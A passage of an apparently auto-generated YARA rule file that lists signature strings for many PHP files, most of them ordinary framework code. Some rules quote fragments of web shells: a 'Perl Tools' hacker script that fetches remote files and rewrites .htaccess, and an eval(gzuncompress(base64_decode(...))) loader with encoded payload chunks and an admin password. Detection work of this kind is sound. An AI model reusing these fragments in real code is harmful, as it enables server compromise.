      $s4 = "use PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\v091\\Protocol\\MethodFrame;" fullword ascii
      $s5 = "* Class QueueUnbindOkFrame" fullword ascii
      $s6 = "namespace PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\v091\\Protocol\\Queue;" fullword ascii
      $s7 = "class QueueUnbindOkFrame implements MethodFrame, IncomingFrame" fullword ascii
      $s8 = "public $frameChannelId = 0;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ReportConfigWriter
{
   meta:
      description = "php22 - file ReportConfigWriter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "342ee667cba2a67ba33d013e4345d4f84b816da3daabe3730caaad4c723e734c"
   strings:
      $s1 = "* Handles writing/merging report config and emitting an event on config save." fullword ascii
      $s2 = "// the config returned from getReportConfig is readonly" fullword ascii
      $s3 = "\\Pimcore\\Config::getReportConfig()->toArray()," fullword ascii
      $s4 = "private function getConfigFile(): string" fullword ascii
      $s5 = "return \\Pimcore\\Config::locateConfigFile('reports.php');" fullword ascii
      $s6 = "use Symfony\\Component\\EventDispatcher\\EventDispatcherInterface;" fullword ascii
      $s7 = "* @var EventDispatcherInterface" fullword ascii
      $s8 = "$this->getConfigFile()," fullword ascii
      $s9 = "$this->mergeConfig(new Config($values));" fullword ascii
      $s10 = "$settings = $settingsEvent->getSettings();" fullword ascii
      $s11 = "use Pimcore\\Event\\Admin\\Report\\SettingsEvent;" fullword ascii
      $s12 = "public function __construct(EventDispatcherInterface $eventDispatcher)" fullword ascii
      $s13 = "public function mergeConfig(Config $values)" fullword ascii
      $s14 = "use Pimcore\\Event\\Admin\\ReportEvents;" fullword ascii
      $s15 = "$this->write($config->toArray());" fullword ascii
      $s16 = "$config = new Config(" fullword ascii
      $s17 = "namespace Pimcore\\Config;" fullword ascii
      $s18 = "$config->merge($values);" fullword ascii
      $s19 = "private $eventDispatcher;" fullword ascii
      $s20 = "ReportEvents::SAVE_SETTINGS," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule removemultiple_class
{
   meta:
      description = "php22 - file removemultiple.class.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3fe429002f4d6a5c99e273672e3600d4b1e2b8920f573b91c5ab8f715503e796"
   strings:
      $s1 = "$this->modx->logManagerAction('source_delete','sources.modMediaSource',$this->source->get('id'));" fullword ascii
      $s2 = "* @subpackage processors.source" fullword ascii
      $s3 = "$this->modx->log(modX::LOG_LEVEL_ERROR,$this->modx->lexicon('source_err_remove'));" fullword ascii
      $s4 = "return 'modSourceRemoveMultipleProcessor';" fullword ascii
      $s5 = "* Log a manager action" fullword ascii
      $s6 = "$this->source = $this->modx->getObject('sources.modMediaSource',$sourceId);" fullword ascii
      $s7 = "class modSourceRemoveMultipleProcessor extends modProcessor {" fullword ascii
      $s8 = "if (empty($sources)) return $this->failure($this->modx->lexicon('source_err_ns'));" fullword ascii
      $s9 = "* Removes multiple Media Sources" fullword ascii
      $s10 = "$sources = $this->getProperty('sources');" fullword ascii
      $s11 = "if ($this->source->get('id') == 1) continue;" fullword ascii
      $s12 = "public function getLanguageTopics() {" fullword ascii
      $s13 = "public function logManagerAction() {" fullword ascii
      $s14 = "* @package modx" fullword ascii
      $s15 = "$this->logManagerAction();" fullword ascii
      $s16 = "/** @var modMediaSource $source */" fullword ascii
      $s17 = "return $this->modx->hasPermission('source_delete');" fullword ascii
      $s18 = "if (!$this->source->checkPolicy('remove')) {" fullword ascii
      $s19 = "$sourceIds = explode(',',$sources);" fullword ascii
      $s20 = "public function checkPermissions() {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule php22_Persona
{
   meta:
      description = "php22 - file Persona.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "75b9a604bf6eeade9e7e8809b5297bc57573616845d5c56b21a9baa15d5f58fd"
   strings:
      $s1 = "* @deprecated Use TargetGroup instead. Will be removed in Pimcore 6" fullword ascii
      $s2 = "* @see Model\\DataObject\\ClassDefinition\\Data::getDataFromResource" fullword ascii
      $s3 = "throw new Model\\Element\\ValidationException('Empty mandatory field [ '.$this->getName().' ]');" fullword ascii
      $s4 = "if (!$persona instanceof Tool\\Targeting\\Persona) {" fullword ascii
      $s5 = "$list = new Tool\\Targeting\\Persona\\Listing();" fullword ascii
      $s6 = "$persona = Tool\\Targeting\\Persona::getById($data);" fullword ascii
      $s7 = "* @param null|Model\\DataObject\\AbstractObject $object" fullword ascii
      $s8 = "public function getDataFromResource($data, $object = null, $params = [])" fullword ascii
      $s9 = "* Checks if data is valid for current data field" fullword ascii
      $s10 = "public function getDataForResource($data, $object = null, $params = [])" fullword ascii
      $s11 = "if (!$omitMandatoryCheck and $this->getMandatory() and empty($data)) {" fullword ascii
      $s12 = "* @param bool $omitMandatoryCheck" fullword ascii
      $s13 = "'key' => $persona->getName()" fullword ascii
      $s14 = "* Static type of this element" fullword ascii
      $s15 = "* @param null $object" fullword ascii
      $s16 = "* @param mixed $params" fullword ascii
      $s17 = "throw new Model\\Element\\ValidationException('Invalid persona reference');" fullword ascii
      $s18 = "* @param $data" fullword ascii
      $s19 = "$options = $obj->getOptions();" fullword ascii
      $s20 = "public function checkValidity($data, $omitMandatoryCheck = false)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule PaymentTransitions
{
   meta:
      description = "php22 - file PaymentTransitions.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f421b83444fcb7eadc376c7b4a37e7c1cc5124baa3d062af6de000b52bb316af"
   strings:
      $s1 = "public const TRANSITION_PROCESS = 'process';" fullword ascii
      $s2 = "public const TRANSITION_COMPLETE = 'complete';" fullword ascii
      $s3 = "namespace Sylius\\Component\\Payment;" fullword ascii
      $s4 = "public const TRANSITION_FAIL = 'fail';" fullword ascii
      $s5 = "public const TRANSITION_REFUND = 'refund';" fullword ascii
      $s6 = "public const TRANSITION_CREATE = 'create';" fullword ascii
      $s7 = "public const TRANSITION_VOID = 'void';" fullword ascii
      $s8 = "public const GRAPH = 'sylius_payment';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_Or
{
   meta:
      description = "php22 - file Or.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "91864a4fda3a7b63f6f896bb3da84c9146a06752f39b462d8c7c4f535b677404"
   strings:
      $s1 = "public function operator(Twig_Compiler $compiler)" fullword ascii
      $s2 = "* This file is part of Twig." fullword ascii
      $s3 = "* (c) 2009 Armin Ronacher" fullword ascii
      $s4 = "class Twig_Node_Expression_Binary_Or extends Twig_Node_Expression_Binary" fullword ascii
      $s5 = "return $compiler->raw('||');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}



rule php22_perl
{
   meta:
      description = "php22 - file perl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6488e9d8ce1eb456b0759240171676a612a688e2547f187a7268796a79e40973"
   strings:
      $s1 = "echo \"<br>[Users] => CHMOD To 755 Complate !\";" fullword ascii
      $s2 = "* CGI Password : jo" fullword ascii
      $s3 = "$cof = \"http://members.multimania.co.uk/perltext/cof.txt\";" fullword ascii
      $s4 = "$cgi = \"http://members.multimania.co.uk/perltext/cgi.txt\";" fullword ascii
      $s5 = "$usr = \"http://members.multimania.co.uk/perltext/usr.txt\";" fullword ascii
      $s6 = "$file = file_get_contents($htaccess);" fullword ascii
      $s7 = "$file = file_get_contents($cgi);" fullword ascii
      $s8 = "$file = file_get_contents($usr);" fullword ascii
      $s9 = "$file = file_get_contents($cof);" fullword ascii
      $s10 = "* Coder : Aldwiry Hack3r" fullword ascii
      $s11 = "echo \"<br> [users] => Has Been Created !\";" fullword ascii
      $s12 = "* Greet : Wesker Hackers And Ox Reda" fullword ascii
      $s13 = "* Must [CHMOD] Function Working !" fullword ascii
      $s14 = "echo \"<br>[Config] => CHMOD To 755 Complate !\";" fullword ascii
      $s15 = "$htaccess = \"http://members.multimania.co.uk/perltext/htaccess\";" fullword ascii
      $s16 = "echo \"<br>[CGI] => CHMOD To 755 Complate !\";" fullword ascii
      $s17 = "* Title : Perl Tools" fullword ascii
      $s18 = "* IP    : 127.0.0.1 :P" fullword ascii
      $s19 = "echo \"<br> [config] => Has Been Created !\";" fullword ascii
      $s20 = "$open = fopen(\"jo/.htaccess\" , 'w');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule PermissionSprunje
{
   meta:
      description = "php22 - file PermissionSprunje.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d9e5b7ea696a6aa2ce31536c11578be5248f79fbb0f1b68c55c620e6d8d61cad"
   strings:
      $x1 = "* @license   https://github.com/userfrosting/UserFrosting/blob/master/licenses/UserFrosting.md (MIT License)" fullword ascii
      $x2 = "* @author Alex Weissman (https://alexanderweissman.com)" fullword ascii
      $x3 = "* UserFrosting (http://www.userfrosting.com)" fullword ascii
      $s4 = "* @link      https://github.com/userfrosting/UserFrosting" fullword ascii
      $s5 = "* Filter LIKE the slug, conditions, or description." fullword ascii
      $s6 = "* Implements Sprunje for the permissions API." fullword ascii
      $s7 = "* PermissionSprunje" fullword ascii
      $s8 = "use UserFrosting\\Sprinkle\\Core\\Sprunje\\Sprunje;" fullword ascii
      $s9 = "namespace UserFrosting\\Sprinkle\\Admin\\Sprunje;" fullword ascii
      $s10 = "* @param string $direction" fullword ascii
      $s11 = "* Sort based on slug." fullword ascii
      $s12 = "* @param Builder $query" fullword ascii
      $s13 = "* {@inheritDoc}" fullword ascii
      $s14 = "->orLike('description', $value);" fullword ascii
      $s15 = "protected function sortProperties($query, $direction)" fullword ascii
      $s16 = "protected function filterProperties($query, $value)" fullword ascii
      $s17 = "return $this->filterProperties($query, $value);" fullword ascii
      $s18 = "$values = explode($this->orSeparator, $value);" fullword ascii
      $s19 = "protected function filterInfo($query, $value)" fullword ascii
      $s20 = "$query->where(function ($query) use ($values) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule ProductAssociationTypeApiTest
{
   meta:
      description = "php22 - file ProductAssociationTypeApiTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4fad5b6b9cea999caf30a8292e74d21efd031bcc1041c5d9d8ab6883d28c1c07"
   strings:
      $s1 = "'HTTP_Authorization' => 'Bearer SampleTokenNjZkNjY2MDEwMTAzMDkxMGE0OTlhYzU3NzYyMTE0ZGQ3ODcyMDAwM2EwMDZjNDI5NDlhMDdlM" fullword ascii
      $s2 = "'HTTP_Authorization' => 'Bearer SampleTokenNjZkNjY2MDEwMTAzMDkxMGE0OTlhYzU3NzYyMTE0ZGQ3ODcyMDAwM2EwMDZjNDI5NDlhMDdlMQ'," fullword ascii
      $s3 = "private function getAssociationTypeUrl(ProductAssociationTypeInterface $productAssociationType)" fullword ascii
      $s4 = "$this->assertResponse($response, 'product_association_type/update_validation_fail_response', Response::HTTP_BAD_REQUEST)" fullword ascii
      $s5 = "$this->assertResponse($response, 'product_association_type/update_validation_fail_response', Response::HTTP_BAD_REQUEST);" fullword ascii
      $s6 = "$this->assertResponse($response, 'product_association_type/create_validation_fail_response', Response::HTTP_BAD_REQUEST);" fullword ascii
      $s7 = "$this->assertResponse($response, 'product_association_type/create_validation_fail_response', Response::HTTP_BAD_REQUEST)" fullword ascii
      $s8 = "$this->client->request('DELETE', $this->getAssociationTypeUrl($productAssociationType), [], [], [" fullword ascii
      $s9 = "$this->client->request('PATCH', $this->getAssociationTypeUrl($productAssociationType), [], [], [" fullword ascii
      $s10 = "$this->assertResponseCode($response, Response::HTTP_NO_CONTENT);" fullword ascii
      $s11 = "$this->client->request('PUT', $this->getAssociationTypeUrl($productAssociationType), [], [], [" fullword ascii
      $s12 = "$this->client->request('GET', $this->getAssociationTypeUrl($productAssociationType), [], [], [" fullword ascii
      $s13 = "* @param ProductAssociationTypeInterface $productAssociationType" fullword ascii
      $s14 = "public function it_denies_getting_product_association_types_for_non_authenticated_user()" fullword ascii
      $s15 = "public function it_returns_not_found_response_when_requesting_details_of_a_product_association_type_which_does_not_exist()" fullword ascii
      $s16 = "public function it_returns_not_found_response_when_trying_to_partially_update_product_association_type_which_does_not_exist()" fullword ascii
      $s17 = "public function it_returns_not_found_response_when_trying_to_partially_update_product_association_type_which_does_not_exist(" fullword ascii
      $s18 = "$productAssociationTypes = $this->loadFixturesFromFile('resources/product_association_types.yml');" fullword ascii
      $s19 = "return 'api/v1/product-association-types/' . $productAssociationType->getCode();" fullword ascii
      $s20 = "$this->assertResponse($response, 'product_association_type/create_response', Response::HTTP_CREATED);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule RealServiceInstantiatorTest
{
   meta:
      description = "php22 - file RealServiceInstantiatorTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "891bc2d80b14259ba91f94e5e317149c8e6211bf566bc9818acc64f352b16e96"
   strings:
      $x1 = "* Tests for {@see \\Symfony\\Component\\DependencyInjection\\Instantiator\\RealServiceInstantiator}." fullword ascii
      $x2 = "$container = $this->getMockBuilder('Symfony\\Component\\DependencyInjection\\ContainerInterface')->getMock();" fullword ascii
      $x3 = "use Symfony\\Component\\DependencyInjection\\LazyProxy\\Instantiator\\RealServiceInstantiator;" fullword ascii
      $s4 = "namespace Symfony\\Component\\DependencyInjection\\Tests\\LazyProxy\\Instantiator;" fullword ascii
      $s5 = "* @author Marco Pivetta <ocramius@gmail.com>" fullword ascii
      $s6 = "use Symfony\\Component\\DependencyInjection\\Definition;" fullword ascii
      $s7 = "$this->assertSame($instance, $instantiator->instantiateProxy($container, new Definition(), 'foo', $callback));" fullword ascii
      $s8 = "$instantiator = new RealServiceInstantiator();" fullword ascii
      $s9 = "public function testInstantiateProxy()" fullword ascii
      $s10 = "class RealServiceInstantiatorTest extends TestCase" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and all of them
}

rule php22_qingshu
{
   meta:
      description = "php22 - file qingshu.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b4f1182a59a83952838852720340a1e8f99f71b88c825b0dcc05046bf26c4e73"
   strings:
      $x1 = "eval(gzuncompress(base64_decode(\"eJzsffl3G8eR8M/ye/4fRmOuAJogLt6kQIk3KfESQeqkHt4AGBAQAQw0AHjI0f4vjLKJV9ZuRInURVEXaZOiLIoiKcnRcx" ascii
      $s2 = "c1/HMb/4laTSUeDiiRCCyLRL1jbYIyBV+baHwMJ30KXCNHUzhMZXXaUQKTJiWFMmTlwW05COid+m6LFMInw0sF+tnXZMhAqFhHDzpAy+MKSXSMt+gBSUkEY90aMmkyaS" ascii
      $s3 = "KLa+8+erHy3ezik9+uTT2evXb/yW9nvno8e+nbWzOwawIsEVPcxdUD0OUpAbCB5ircwuN/v/6ZQ1iZxjSCQSVLuvz42v2FZzy5mpbcSWG5oOtATzxoK6L40ZWuiGQw84" ascii
      $s4 = "/17SWpOOhJwslRJZ1xEHxgioH4H1fUMPZ9B47pTlIHyATfd5QgKCqQbSvf3fj5zU/wLH3lJ+c/rBdsglOggMnFCqHejtM4iUjLJ7OyOukT03Ic2hQIhyP72W2iswQ/IK" ascii
      $s5 = "JdNPVw0GDRrjNQ24FlrGGCyD0nduygttcCBaKNBh0PVJpRSTJzWTyjyvhgsBzHN4OZoX9iEuPf7oVfWg59h5IODXk23UdLlTeSVyRLS3e8JezYwU3QsX9YW2TVXaQK0h" ascii
      $s6 = "zn+rDakNXj9df2kqMMfeHAUz3idV9Qi8C+8k6K1aBlkdhcPrFK5KsfW/swwAbzZyi+rBErrb/TuuaGdY2ZWOaeP5rKs2zy2+VxeysFQ6qwN5lNBGU1gHbGEt79QSqG6m" ascii
      $s7 = "P3x0r0rQT2vGcBA5HNpxiwFPnp/EMsvfkUlJp0avLW72YXWU325MLXt2amzhRjI1rO+q6APrFAhp0CtWAbi1FnBHJg/YJjTkLk/FWD/nIDRd9XffWh4vRCws8uPvni+l" ascii
      $s8 = "lvurAVYWXp8u/Xfr1+duHDO88efvH4Rw7P6ln8Tj6/99m9FyvfPXm8evbx9PzG/LfLz5wP7ix8/nDqwW83n6/+Yu0n0EUpnIglj9lCUTk0ajsO/RQ9IumAsPyrqy9MoJ" ascii
      $s9 = "4p8keP8OyFspFwmsHkUY2twAfjWRngE6hyWEhnQ+hNH8nG45OClDZEj6D9sGwnL4ZSIjZBDm+Pl+7atZO8OQGqP+y60hYl6NNaZJLl91tK2jJCJAasm4nKBmS06kX6XQ" ascii
      $s10 = "V1yUOD6ehkryd7YrLKP3BkMJnoq05OJnpCddGjR6orj1aeTGQPNlcpg3VH9stH/WOZiWC37PEmemJj7vT+1pqjTeFwsq8rpXbUKkNdR1L+eORwy+Shfb3NtRUn9sfDXR" ascii
      $s11 = "aTUS+bXr60SR0trvx+ZR729ccomuQhzycfrq0dv/Xd8q+OebyuurrjDty/Yq3Lj1e/dtJqVM7dvLv44dzHm19f31ifwyfWZhcfbqxMO5ae3bx+Z4nYreD7ZzfvglQGfp" ascii
      $s12 = "JyXukKV12W3ysESZNJu5CstmPb9UpmtU2gAfuc5kohbYN7Lt9nT0Gg6HoYO44q71m8UC3+BKQWmtp6ayayV7ckmL52QxzVyrBmiHOeyJkWLYGK8w8x1Nq5XyEFIRIPpf" ascii
      $s13 = "gy8/45OpVQ3uVm25HNiCwCegIOsVQ6LqWjkCmpqjRJxVRpA51dhYpgHhG9LlciNuEMx+OzizN/QqWkBL6HyViJNUczrsHm3mRHTyQSV082tyclOd2cmDzaE2qZSHtHK6" ascii
      $s14 = "$admin['pass']  = \"9724020\";  //" fullword ascii
      $s15 = "3Up+1OW+luFyskNvCzZOu5poFv0PIDuIYYr3OdNpAl+qQkH+UJFDvmOsdCSjaZsZsTS8s9xxsYk9kKM/pEuc3JAZfmlS/ElILGlTbDLLTZLCDIlCAEAiyDQoeclFUpI4" ascii
      $s16 = "LfUTmegj/05QryAQNQwIcQKFv4B3e/8JeoivA3HJuE30kFfimj+F2Ow+/0SfxNAk/Bn2AQfkcyCBd2nfA7o+DvpDyOtUBI4xdQlOGPjKFWEMXECPkNuii2Ni4jiCA0is" ascii
      $s17 = "lyGyY1ncRksyQwGKAmYaFrX8FkgeqrZ4lF1xZHNiYsDAc3lvscg9C4++vHC7SdvH0M4nRlceFFEaqrdFEvSG/YjhhXfSA3S/FpoPCanankOXW07YvZUIrl52xfLOoDHT" ascii
      $s18 = "9SWM7A9+3bA//82aANmW1+vamybg147m5H+MsK6EaI3xnIU5frs4Q9DqlmJkFSLsFST3pqrNGraTPm6u7NaHK5gxNM2xHmz6Mi/MMm/AqRlm1Z0K/9rEmLL2ABj2FitH" ascii
      $s19 = "WNh+llmDjoLCyJlTZC6ZJIWZlhPNiOJswStU1ezAf6SllJmJmSiLTfAt4ZEuWUsg2yHK7awJzCla/JnVdJGD7hRWIpuw9jwxwhuBYDRgSPVsdcdHUGC9//zaMXpLn1h/" ascii
      $s20 = "+RHd+n9/6Ig8zfWN3JTJX/90/aLecP0hELFuJv3VTd1lLvGqcHhC5QEZyxZMyschXmeb6D/Ltw/ePbd3+GHy/dnp2//fTGxu171vtEBo+deeId/9IXN79+cIcw8epZPz" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule PEARClass
{
   meta:
      description = "php22 - file PEARClass.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6bb8207c9c3382a206e44d874de9a5244e034b8bbdbf1e7ecc4e95999edd89b4"
   strings:
      $s1 = "class Symfony_Component_Debug_Tests_Fixtures_PEARClass" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_Reader
{
   meta:
      description = "php22 - file Reader.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c4dcc34409f1b840252c03083d4f3edcdde521273d041cf4a7c1f79bed4a9a1a"
   strings:
      $x1 = "* @license http://code.google.com/p/sabredav/wiki/License Modified BSD License" fullword ascii
      $s2 = "* If this option is passed to the reader, it will be less strict about the" fullword ascii
      $s3 = "* @author Evert Pot (http://www.rooftopsolutions.nl/)" fullword ascii
      $s4 = "* The options argument is a bitfield. Pass any of the OPTIONS constant to" fullword ascii
      $s5 = "* @copyright Copyright (C) 2007-2013 Rooftop Solutions. All rights reserved." fullword ascii
      $s6 = "* and defeats OOP principals. Needs refactoring in a future version." fullword ascii
      $s7 = "* Currently using this option just means, that it will accept underscores" fullword ascii
      $s8 = "* This method receives the full array of lines. The array pointer is used" fullword ascii
      $s9 = "* Parses the file and returns the top component" fullword ascii
      $s10 = "* TODO: this class currently completely works 'statically'. This is pointless," fullword ascii
      $s11 = "* Reads a parameter list from a property" fullword ascii
      $s12 = "* This method returns null if an invalid line was encountered, and the" fullword ascii
      $s13 = "* Reads and parses a single line." fullword ascii
      $s14 = "* This class reads the vobject file, and returns a full element tree." fullword ascii
      $s15 = "* to traverse." fullword ascii
      $s16 = "* @param int $options See the OPTIONS constants." fullword ascii
      $s17 = "throw new ParseException('Invalid VObject, expected: \"END:' . $obj->name . '\" got: \"' . $nextLine . '\"');" fullword ascii
      $s18 = "* by the reader." fullword ascii
      $s19 = "static private function readLine(&$lines, $options = 0) {" fullword ascii
      $s20 = "* IGNORE_INVALID_LINES option was turned on." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule PrioritizedServiceRegistry
{
   meta:
      description = "php22 - file PrioritizedServiceRegistry.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6103b35e1b77d456b441225312f6ebd711ac8dbfb22896acea96d54dadba2cb2"
   strings:
      $s1 = "throw new NonExistingServiceException($this->context, gettype($service), array_keys($this->services->toArray()));" fullword ascii
      $s2 = "* Human readable context for these services, e.g. \"tax calculation\"" fullword ascii
      $s3 = "* Interface which is required by all services." fullword ascii
      $s4 = "* @param object $service" fullword ascii
      $s5 = "public function __construct(string $interface, string $context = 'service')" fullword ascii
      $s6 = "private function assertServiceHaveType($service): void" fullword ascii
      $s7 = "* @param string $interface" fullword ascii
      $s8 = "public function register($service, int $priority = 0): void" fullword ascii
      $s9 = "$this->context . ' needs to implement \"%2$s\", \"%s\" given.'" fullword ascii
      $s10 = "* @var PriorityQueue" fullword ascii
      $s11 = "final class PrioritizedServiceRegistry implements PrioritizedServiceRegistryInterface" fullword ascii
      $s12 = "public function unregister($service): void" fullword ascii
      $s13 = "private $services;" fullword ascii
      $s14 = "$this->services->insert($service, $priority);" fullword ascii
      $s15 = "return $this->services->contains($service);" fullword ascii
      $s16 = "$this->assertServiceHaveType($service);" fullword ascii
      $s17 = "namespace Sylius\\Component\\Registry;" fullword ascii
      $s18 = "public function has($service): bool" fullword ascii
      $s19 = "$this->services = new PriorityQueue();" fullword ascii
      $s20 = "$this->services->remove($service);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule RedisHandler
{
   meta:
      description = "php22 - file RedisHandler.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c0f5261b56b6fb6229d7113d11c11065c48a3c93c79eab8951a4c549273bb3dd"
   strings:
      $x1 = "log_message('error', 'Session: Unable to obtain lock for ' . $this->keyPrefix . $sessionID . ' after 30 attempts, aborting.');" fullword ascii
      $x2 = "$this->logger->error('Session: Error while trying to obtain lock for ' . $this->keyPrefix . $sessionID);" fullword ascii
      $x3 = "$this->logger->error('Session: Got RedisException on close(): ' . $e->getMessage());" fullword ascii
      $x4 = "$this->logger->debug('Session: Redis::delete() expected to return 1, got ' . var_export($result, TRUE) . ' instead.');" fullword ascii
      $x5 = "$this->logger->error('Session: Unable to connect to Redis with the configured settings.');" fullword ascii
      $x6 = "$this->logger->error('Session: Unable to select Redis database with index ' . $this->savePath['database']);" fullword ascii
      $s7 = "$this->logger->error('Session: Error while trying to free lock for ' . $this->lockKey);" fullword ascii
      $s8 = "log_message('debug', 'Session: Lock for ' . $this->keyPrefix . $sessionID . ' had no TTL, overriding.');" fullword ascii
      $s9 = "* Copyright (c) 2014-2018 British Columbia Institute of Technology" fullword ascii
      $s10 = "if ($this->fingerprint !== ($fingerprint = md5($sessionData)) || $this->keyExists === FALSE)" fullword ascii
      $s11 = "$this->logger->error('Session: Unable to authenticate to Redis instance.');" fullword ascii
      $s12 = "if ( ! $redis->connect($this->savePath['host'], $this->savePath['port'], $this->savePath['timeout']))" fullword ascii
      $s13 = "=> preg_match('#timeout=(\\d+\\.\\d+)#', $matches[3], $match) ? (float) $match[1] : null," fullword ascii
      $s14 = "is_string($session_data) ? $this->keyExists = TRUE : $session_data = '';" fullword ascii
      $s15 = "https://codeigniter.com" fullword ascii
      $s16 = "elseif (isset($this->savePath['password']) && ! $redis->auth($this->savePath['password']))" fullword ascii
      $s17 = "$session_data = $this->redis->get($this->keyPrefix . $sessionID);" fullword ascii
      $s18 = "* This content is released under the MIT License (MIT)" fullword ascii
      $s19 = "* Reads session data and acquires a lock" fullword ascii
      $s20 = "return $this->redis->setTimeout($this->keyPrefix . $sessionID, $this->sessionExpiration);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule PimcoreCacheItemInterface
{
   meta:
      description = "php22 - file PimcoreCacheItemInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b9afac85383d819c0224e385bdaaf8acd658062324a512b8c7f6fef49fce2d06"
   strings:
      $s1 = "* Get currently set tags" fullword ascii
      $s2 = "* Merge tags into currently set tags" fullword ascii
      $s3 = "public function getDefaultLifetime();" fullword ascii
      $s4 = "public function mergeTags(array $tags);" fullword ascii
      $s5 = "public function getTags();" fullword ascii
      $s6 = "public function getExpiry();" fullword ascii
      $s7 = "* @return TaggableCacheItemInterface" fullword ascii
      $s8 = "interface PimcoreCacheItemInterface extends TaggableCacheItemInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule PSR0LocatorSpec
{
   meta:
      description = "php22 - file PSR0LocatorSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e1fe3b050280c2f47a36d6b5552426b0297bf6dc7e588db008ac57bb49aaab3b"
   strings:
      $s1 = "'Please see reference document: https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-0.md'" fullword ascii
      $s2 = "$fs->getFileContents($filePath)->willReturn('<?php namespace InvalidSpecNamespace\\\\PhpSpec; class ServiceContainer {} ?>');" fullword ascii
      $s3 = "$fs->getFileContents($filePath)->willReturn('<?php namespace InvalidSpecNamespace\\\\PhpSpec; class ServiceContainer {} ?>" fullword ascii
      $s4 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\PhpSpec\\\\Runner; class ExampleRunner {} ?>');" fullword ascii
      $s5 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\PhpSpec\\\\Locator\\\\PSR0; class PSR0LocatorSpec {} ?>');" fullword ascii
      $s6 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\PhpSpec\\\\Locator\\\\PSR0; class PSR0LocatorSpec {} ?>')" fullword ascii
      $s7 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\PhpSpec\\\\Locator\\\\PSR0; class PSR0Locator {} ?>');" fullword ascii
      $s8 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\PhpSpec; class Container {} ?>');" fullword ascii
      $s9 = "$this->getFullSpecPath()->shouldReturn(__DIR__.DIRECTORY_SEPARATOR.'Cust'.DIRECTORY_SEPARATOR.'Ns'.DIRECTORY_SEPARATOR);" fullword ascii
      $s10 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\PhpSpec\\\\Console; class App {} ?>');" fullword ascii
      $s11 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\Some; class ClassSpec {} ?>');" fullword ascii
      $s12 = "$fs->getFileContents($filePath)->willReturn('<?php namespace spec\\\\PhpSpec; class Some_Class {} ?>');" fullword ascii
      $s13 = "$filePath = $this->specPath.$this->convert_to_path('/spec/PhpSpec/Runner/ExampleRunnerSpec.php');" fullword ascii
      $s14 = "$this->beConstructedWith($filesystem, 'Test\\\\Namespace\\\\PhpSpec', 'spec', $this->srcPath, $this->specPath, 'Test\\\\Namesp" fullword ascii
      $s15 = "function it_supports_psr0_namespace_queries_with_a_namespace_prefix(Filesystem $filesystem)" fullword ascii
      $s16 = "$fs->findSpecFilesIn($this->specPath.$this->convert_to_path('/spec/PhpSpec/Runner/'))->willReturn(array($file));" fullword ascii
      $s17 = "$filesystem->pathExists($this->specPath.$this->convert_to_path('/spec/PhpSpec/Console/ApplicationSpec.php'))->willReturn(true);" fullword ascii
      $s18 = "$filesystem->pathExists($this->specPath.$this->convert_to_path('/spec/PhpSpec/Console/ApplicationSpec.php'))->willReturn" fullword ascii
      $s19 = "$exception = new \\RuntimeException('Spec class `InvalidSpecNamespace\\\\PhpSpec\\\\ServiceContainer` must be in the base spe" fullword ascii
      $s20 = "$exception = new \\RuntimeException(sprintf('Spec file \"%s\" does not contains any class definition.', $filePath));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule PH_Vdayv
{
   meta:
      description = "php22 - file PH_Vdayv.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4012fe772b284c1d1aa4ed41767230109b725df8e9e39580774663b270c83b1a"
   strings:
